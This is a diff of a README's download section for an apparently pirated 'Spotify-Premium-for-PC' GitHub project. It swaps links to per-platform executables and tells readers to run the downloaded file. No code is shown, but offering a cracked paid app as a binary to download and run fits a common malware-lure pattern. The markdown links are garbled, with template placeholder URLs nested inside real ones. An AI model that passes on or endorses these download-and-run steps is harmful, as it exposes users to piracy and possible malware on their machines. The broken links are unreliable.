@@ -30,9 +30,9 @@ To use this software, follow these steps:
 
 2. Download the latest release by selecting the appropriate executable file for your operating system. Choose the version that best suits your needs.
 
-    - For Windows: [Download Windows Executable]([https://github.com/your-username/your-repository/releases/latest/download/your-software-windows.exe](https://github.com/PollarJay/Spotify-Premium-for-PC/releases/tag/Major-windows))
-    - For macOS: [Download macOS Executable]([https://github.com/your-username/your-repository/releases/latest/download/your-software-macos](https://github.com/PollarJay/Spotify-Premium-for-PC/releases/tag/Major-macos))
-    - For Linux: [Download Linux Executable]([https://github.com/your-username/your-repository/releases/latest/download/your-software-linux](https://github.com/PollarJay/Spotify-Premium-for-PC/releases/tag/Major))
+    - For Windows: [Download Windows Executable](https://github.com/your-username/your-repository/releases/latest/download/your-software-windows.exe](https://github.com/PollarJay/Spotify-Premium-for-PC/releases/tag/Major-windows](https://github.com/PollarJay/Spotify-Premium-for-PC/releases/tag/Major-windows)
+    - For macOS: [Download macOS Executable](https://github.com/PollarJay/Spotify-Premium-for-PC/releases/tag/Major-macos)
+    - For Linux: [Download Linux Executable]([[https://github.com/your-username/your-repository/releases/latest/download/your-software-linux](https://github.com/PollarJay/Spotify-Premium-for-PC/releases/tag/Major)](https://github.com/PollarJay/Spotify-Premium-for-PC/releases/tag/Major))
 
 3. Once the download is complete, run the executable file just like you would with any other software installation. Follow any on-screen instructions for setup.
 
